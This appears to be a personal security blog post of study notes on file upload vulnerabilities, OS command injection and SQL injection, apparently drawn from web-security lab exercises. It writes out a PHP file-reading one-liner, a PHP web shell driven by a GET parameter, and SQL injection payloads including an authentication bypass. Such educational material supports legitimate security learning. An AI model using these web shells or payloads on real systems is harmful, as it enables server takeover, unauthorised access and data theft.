---
title: File Upload Vulnerabilities
date: 2024-03-05 20:00 
categories: [Path Traversal]
tags: [HTTP, POST, Server]
author: jamarapo
---



File upload vulnerabilities happen when a website lets people upload files without checking if they're safe. This means the server doesn't properly look at things like the file's name, type, what's inside it, or how big it is. Without these checks, someone could use a seemingly harmless feature like uploading a picture to actually put harmful files on the server. These files could even include scripts that let them control the server from afar.

Sometimes, just uploading the file can cause problems. Other times, attackers might send another request to the server to make it run the uploaded file, causing even more trouble.

 Developers implement what they believe to be robust validation that is either inherently flawed or can be easily bypassed. For example, they may attempt to blacklist dangerous file types, but fail to account for parsing discrepancies when checking the file extensions. As with any blacklist, it's also easy to accidentally omit more obscure file types that may still be dangerous. 


  For example, the following PHP one-liner could be used to read arbitrary files from the server's filesystem:
```php
<?php echo file_get_contents('/path/to/target/file'); ?>
```

Once uploaded, sending a request for this malicious file will return the target file's contents in the response.

A more versatile web shell may look something like this:
```php
<?php echo system($_GET['command']); ?>
```

This script enables you to pass an arbitrary system command via a query parameter as follows:
GET /example/exploit.php?command=id HTTP/1.1



![alt text](/assets/img/posts/File%20Upload/image.png)

![alt text](/assets/img/posts/File%20Upload/image-1.png)

![alt text](/assets/img/posts/File%20Upload/image-2.png)

Out in the real world, it's rare to come across a website that completely lacks protection against file upload attacks, like the one we tested in the last exercise. However, just because websites have defenses in place doesn't guarantee they're strong enough. Sometimes, there are still weaknesses in these defenses that can be exploited. These vulnerabilities might allow attackers to gain control over the website remotely by using what's called a "web shell" for executing code.

For simple text data, HTML forms use POST requests with content type application/x-www-form-url-encoded, but for large binary files like images or PDFs, multipart/form-data is preferred.

Websites can check the Content-Type header of uploaded files to make sure they match an expected type, like image files being image/jpeg or image/png. However, if the server only relies on this header without checking the file's content, it can be tricked into accepting harmful files. Tools like Burp Repeater can exploit this weakness.


![alt text](/assets/img/posts/File%20Upload/image-3.png)

![alt text](/assets/img/posts/File%20Upload/image-4.png)

## OS Command Injection

Preventing OS command injection requires robust input validation and sanitization practices, as well as using secure coding techniques such as parameterized queries in database interactions and utilizing secure APIs for executing system commands. Regular security audits and vulnerability assessments can also help identify and mitigate such vulnerabilities before they are exploited by malicious actors.

`https://insecure-website.com/stockStatus?productID=381&storeID=29`

**shell command**: stockreport.pl 381 29


- The original stockreport.pl command was executed without its expected arguments, and so returned an error message.
- The injected echo command was executed, and the supplied string was echoed in the output.
- The original argument 29 was executed as a command, which caused an error.

![alt text](/assets/img/posts/File%20Upload/image-5.png)


## SQL Injection
SQL injection (SQLi) goes beyond just peeking at data. Attackers can also:

- Modify or Delete Data: Injected code can alter or erase sensitive information within the database.
  
- Gain Control: In severe cases, attackers can leverage SQLi to take complete control of the server hosting the database.
  
- DDoS Attacks: SQLi can be used to overwhelm the database with requests, rendering it inaccessible to legitimate users (denial-of-service attack).

 You can detect SQL injection manually using a systematic set of tests against every entry point in the application. To do this, you would typically submit:

  - The single quote character ' and look for errors or other anomalies.
  
  - Some SQL-specific syntax that evaluates to the base (original) value of the entry point, and to a different value, and look for systematic differences in the application responses.
  
  - Boolean conditions such as OR 1=1 and OR 1=2, and look for differences in the application's responses.
  
  - Payloads designed to trigger time delays when executed within a SQL query, and look for differences in the time taken to respond.
  
  - OAST payloads designed to trigger an out-of-band network interaction when executed within a SQL query, and monitor any resulting interactions.

`https://insecure-website.com/products?category=Gifts`

This causes the application to make a SQL query to retrieve details of the relevant products from the database:
```SQL
SELECT * FROM products WHERE category = 'Gifts' AND released = 1
```
`https://insecure-website.com/products?category=Gifts'--`

This results in the SQL query:
```sql 
SELECT * FROM products WHERE category = 'Gifts'--' AND released = 1
```

Crucially, note that -- is a comment indicator in SQL. This means that the rest of the query is interpreted as a comment, effectively removing it. In this example, this means the query no longer includes AND released = 1. As a result, all products are displayed, including those that are not yet released. 

`https://insecure-website.com/products?category=Gifts'+OR+1=1--`

This results in the SQL query:
```SQL
SELECT * FROM products WHERE category = 'Gifts' OR 1=1--' AND released = 1
```

The modified query returns all items where either the category is Gifts, or 1 is equal to 1. As 1=1 is always true, the query returns all items. 


![alt text](/assets/img/posts/File%20Upload/image-6.png)


Subverting application logic

Imagine an application that lets users log in with a username and password. If a user submits the username wiener and the password bluecheese, the application checks the credentials by performing the following SQL query:
```sql
SELECT * FROM users WHERE username = 'wiener' AND password = 'bluecheese'
```
If the query returns the details of a user, then the login is successful. Otherwise, it is rejected.

In this case, an attacker can log in as any user without the need for a password. They can do this using the SQL comment sequence -- to remove the password check from the WHERE clause of the query. For example, submitting the username administrator'-- and a blank password results in the following query:
```sql
SELECT * FROM users WHERE username = 'administrator'--' AND password = ''
```
This query returns the user whose username is administrator and successfully logs the attacker in as that user.

![alt text](/assets/img/posts/File%20Upload/image-7.png)

![alt text](/assets/img/posts/File%20Upload/image-8.png)

